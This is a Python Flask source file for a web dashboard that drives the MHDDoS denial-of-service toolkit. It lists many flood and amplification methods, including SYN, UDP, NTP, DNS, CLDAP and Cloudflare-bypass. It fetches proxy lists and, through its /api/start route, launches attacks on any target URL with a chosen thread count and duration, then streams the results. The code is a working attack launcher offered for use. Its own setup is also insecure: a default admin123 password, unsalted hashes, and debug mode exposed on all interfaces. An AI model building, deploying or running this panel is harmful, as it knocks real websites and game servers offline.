import os, json, time, threading, subprocess, platform, re, hashlib, warnings, secrets
warnings.filterwarnings("ignore")
from datetime import datetime
from flask import Flask, render_template, request, jsonify, session, redirect

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

MHDDOS_DIR = os.path.join(os.path.dirname(__file__), "MHDDoS")
USERS_FILE = os.path.join(os.path.dirname(__file__), "users.json")

attack_process = None
attack_start_time = None
stats_cache = {"requests": 0, "success": 0, "rate": 0, "running": False}
log_buffer = []
cpu_history = []
mem_history = []
cpu_per_core_history = []

CPU_INFO = {"model": "N/A", "cores": 0, "threads": 0}

LAYER7_METHODS = [
    "GET", "POST", "OVH", "RHEX", "STOMP", "STRESS", "DYN", "DOWNLOADER",
    "SLOW", "HEAD", "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB",
    "BOT", "APACHE", "XMLRPC", "CFB", "CFBUAM", "BYPASS", "BOMB", "KILLER", "TOR"
]

LAYER4_METHODS = [
    "TCP", "UDP", "SYN", "CPS", "CONNECTION", "VSE", "TS3", "FIVEM", "FIVEM-TOKEN",
    "MINECRAFT", "MCBOT", "MCPE", "MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP"
]

def hash_pw(pw):
    return hashlib.sha256(pw.encode()).hexdigest()

def init_users():
    if not os.path.exists(USERS_FILE):
        with open(USERS_FILE, "w") as f:
            json.dump({"admin": {"password": hash_pw("admin123"), "changed": False}}, f)

def load_users():
    with open(USERS_FILE) as f:
        return json.load(f)

def save_users(users):
    with open(USERS_FILE, "w") as f:
        json.dump(users, f, indent=2)

def login_required(f):
    from functools import wraps
    @wraps(f)
    def wrapper(*a, **kw):
        if not session.get("logged_in"):
            if request.path.startswith("/api/"):
                return jsonify({"error": "Not authenticated"}), 401
            return redirect("/login")
        if not session.get("pw_changed"):
            if request.path.startswith("/api/"):
                return jsonify({"error": "Password not changed"}), 403
            if request.path not in ("/change-password",):
                return redirect("/change-password")
        return f(*a, **kw)
    return wrapper

def detect_cpu():
    global CPU_INFO
    try:
        with open("/proc/cpuinfo") as f:
            text = f.read()
        model = "N/A"
        for line in text.split("\n"):
            if "model name" in line:
                model = line.split(":")[1].strip()
                break
        cores = 0
        for line in text.split("\n"):
            if "cpu cores" in line:
                cores = int(line.split(":")[1].strip())
                break
        count = text.count("processor\t:")
        CPU_INFO = {"model": model, "cores": cores or count, "threads": count or 1}
    except:
        CPU_INFO = {"model": "Unknown", "cores": 1, "threads": 1}

def get_cpu_per_core():
    try:
        with open("/proc/stat") as f:
            lines = f.readlines()
        result = []
        for line in lines:
            if line.startswith("cpu") and line[3].isdigit():
                parts = line.split()
                core_id = parts[0][3:]
                user = int(parts[1]); nice = int(parts[2]); sys = int(parts[3]); idle = int(parts[4])
                result.append({"core": core_id, "total": user + nice + sys + idle, "idle": idle})
        return result
    except:
        return []

prev_cpu = None
def get_cpu_usage():
    global prev_cpu
    cur = get_cpu_per_core()
    if not cur:
        return {"overall": 0, "per_core": []}
    if prev_cpu:
        per_core = []
        for c, p in zip(cur, prev_cpu):
            dt = c["total"] - p["total"]
            di = c["idle"] - p["idle"]
            per_core.append({"core": c["core"], "usage": round((1 - di / max(dt, 1)) * 100, 1) if dt > 0 else 0})
        overall = round(sum(x["usage"] for x in per_core) / max(len(per_core), 1), 1)
        prev_cpu = cur
        return {"overall": overall, "per_core": per_core}
    prev_cpu = cur
    return {"overall": 0, "per_core": [{"core": c["core"], "usage": 0} for c in cur]}

def get_system_info():
    try:
        cd = get_cpu_usage()
        mem = "N/A"
        if platform.system() == "Linux":
            r = subprocess.run("free -m | awk 'NR==2{printf \"%.1f\", $3*100/$2}'", shell=True, capture_output=True, text=True, timeout=3)
            mem = r.stdout.strip()
        cpu_history.append({"time": datetime.now().strftime("%H:%M:%S"), "value": cd["overall"]})
        mv = float(mem) if mem and mem != "N/A" else 0
        mem_history.append({"time": datetime.now().strftime("%H:%M:%S"), "value": mv})
        cpu_per_core_history.append({"time": datetime.now().strftime("%H:%M:%S"), "cores": cd["per_core"]})
        while len(cpu_history) > 60: cpu_history.pop(0)
        while len(mem_history) > 60: mem_history.pop(0)
        while len(cpu_per_core_history) > 60: cpu_per_core_history.pop(0)
        return {"cpu": cd["overall"], "cpu_per_core": cd["per_core"], "memory": mem, "cpu_info": CPU_INFO,
                "cpu_history": list(cpu_history), "mem_history": list(mem_history), "cpu_core_history": cpu_per_core_history}
    except:
        return {"cpu": 0, "cpu_per_core": [], "memory": "N/A", "cpu_info": CPU_INFO,
                "cpu_history": [], "mem_history": [], "cpu_core_history": []}

def get_proxy_stats():
    p = os.path.join(MHDDOS_DIR, "files", "proxies", "http.txt")
    if not os.path.exists(p): return {"socks5": 0, "http": 0, "https": 0, "total": 0}
    try:
        with open(p) as f:
            lines = [l.strip() for l in f if l.strip()]
        return {"socks5": 0, "http": len(lines), "https": 0, "total": len(lines)}
    except:
        return {"socks5": 0, "http": 0, "https": 0, "total": 0}

def get_uptime():
    if not attack_start_time: return "00:00:00"
    el = int(time.time() - attack_start_time)
    return f"{el//3600:02d}:{(el%3600)//60:02d}:{el%60:02d}"

def parse_output(line):
    global stats_cache, log_buffer
    log_buffer.append({"time": datetime.now().strftime("%H:%M:%S"), "text": line})
    if len(log_buffer) > 500: log_buffer = log_buffer[-500:]
    m = re.search(r"Sent:\s*([\d,]+)", line)
    if m:
        stats_cache["requests"] = int(m.group(1).replace(",", ""))
        stats_cache["running"] = True

def monitor_output(proc):
    global stats_cache
    for line in iter(proc.stdout.readline, ""):
        if not line: break
        line = line.rstrip()
        if line: parse_output(line)
    proc.wait()
    stats_cache["running"] = False

def fetch_mhd_proxies():
    try:
        with open(os.path.join(MHDDOS_DIR, "config.json")) as f:
            cfg = json.load(f)
        for prov in cfg.get("proxy-providers", []):
            ptype, purl, timeout = prov["type"], prov["url"], prov.get("timeout", 5)
            fname = {1: "http.txt", 4: "socks4.txt", 5: "socks5.txt"}.get(ptype, "http.txt")
            fpath = os.path.join(MHDDOS_DIR, "files", "proxies", fname)
            try:
                import requests as req
                r = req.get(purl, timeout=timeout)
                if r.status_code == 200:
                    with open(fpath, "w") as f: f.write(r.text)
            except: pass
    except: pass

init_users()

@app.route("/")
@login_required
def index():
    return render_template("index.html", methods=LAYER7_METHODS + LAYER4_METHODS)

@app.route("/login")
def login_page():
    if session.get("logged_in"):
        if not session.get("pw_changed"):
            return redirect("/change-password")
        return redirect("/")
    return render_template("login.html")

@app.route("/change-password")
def change_pw_page():
    if not session.get("logged_in"):
        return redirect("/login")
    return render_template("change-password.html")

@app.route("/api/login", methods=["POST"])
def api_login():
    data = request.json
    username = data.get("username", "").strip()
    password = data.get("password", "").strip()
    users = load_users()
    if username not in users or users[username]["password"] != hash_pw(password):
        return jsonify({"error": "Invalid credentials"}), 401
    session["logged_in"] = True
    session["username"] = username
    session["pw_changed"] = users[username]["changed"]
    return jsonify({"message": "OK", "pw_changed": users[username]["changed"]})

@app.route("/api/change-password", methods=["POST"])
def api_change_password():
    if not session.get("logged_in"):
        return jsonify({"error": "Not logged in"}), 401
    data = request.json
    old = data.get("old_password", "").strip()
    new = data.get("new_password", "").strip()
    if len(new) < 4:
        return jsonify({"error": "Password must be at least 4 characters"}), 400
    username = session["username"]
    users = load_users()
    if users[username]["password"] != hash_pw(old):
        return jsonify({"error": "Current password is incorrect"}), 401
    users[username]["password"] = hash_pw(new)
    users[username]["changed"] = True
    save_users(users)
    session["pw_changed"] = True
    return jsonify({"message": "Password changed successfully"})

@app.route("/api/check-auth")
def api_check_auth():
    return jsonify({"logged_in": session.get("logged_in", False), "pw_changed": session.get("pw_changed", False)})

@app.route("/api/logout", methods=["POST"])
def api_logout():
    session.clear()
    return jsonify({"message": "Logged out"})

@app.route("/api/system")
@login_required
def api_system():
    return jsonify({"proxies": get_proxy_stats(), "system": get_system_info(), "uptime": get_uptime(), "stats": stats_cache})

@app.route("/api/logs")
@login_required
def api_logs():
    since = request.args.get("since", 0, type=int)
    return jsonify(log_buffer[since:])

@app.route("/api/methods")
@login_required
def api_methods():
    return jsonify({"layer7": LAYER7_METHODS, "layer4": LAYER4_METHODS})

@app.route("/api/proxies/fetch", methods=["POST"])
@login_required
def api_fetch():
    threading.Thread(target=fetch_mhd_proxies, daemon=True).start()
    return jsonify({"message": "Fetching proxies..."})

@app.route("/api/start", methods=["POST"])
@login_required
def api_start():
    global attack_process, attack_start_time, stats_cache, log_buffer
    if attack_process and attack_process.poll() is None:
        return jsonify({"error": "Attack already running"}), 400
    data = request.json
    target = data.get("url", "").strip()
    if not target: return jsonify({"error": "URL is required"}), 400
    method = data.get("method", "GET").upper()
    threads = str(data.get("threads", 100))
    duration = str(data.get("duration", 60))
    proxy_type = str(data.get("proxy_type", 0))
    rpc = str(data.get("rpc", 10))
    log_buffer = []
    stats_cache = {"requests": 0, "success": 0, "rate": 0, "running": True}
    attack_start_time = time.time()
    cmd = ["python3", "-u", os.path.join(MHDDOS_DIR, "start.py")]
    if method in LAYER7_METHODS:
        cmd += [method, target, proxy_type, threads, "http.txt", rpc, duration]
    elif method in LAYER4_METHODS:
        from urllib.parse import urlparse
        parsed = urlparse(target)
        host = parsed.hostname or target
        port = parsed.port or 80
        cmd += [method, f"{host}:{port}", threads, duration]
    else:
        return jsonify({"error": f"Unknown method: {method}"}), 400
    env = os.environ.copy()
    env["PYTHONWARNINGS"] = "ignore"
    attack_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, start_new_session=True, cwd=MHDDOS_DIR, env=env)
    threading.Thread(target=monitor_output, args=(attack_process,), daemon=True).start()
    return jsonify({"message": f"Attack started with {method}", "pid": attack_process.pid})

@app.route("/api/stop", methods=["POST"])
@login_required
def api_stop():
    global attack_process, stats_cache
    if attack_process and attack_process.poll() is None:
        attack_process.terminate()
        try: attack_process.wait(timeout=5)
        except: attack_process.kill()
        stats_cache["running"] = False
        parse_output("[STATUS] Stopped by user")
        return jsonify({"message": "Attack stopped"})
    return jsonify({"message": "No attack running"}), 400

detect_cpu()
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80, debug=True)
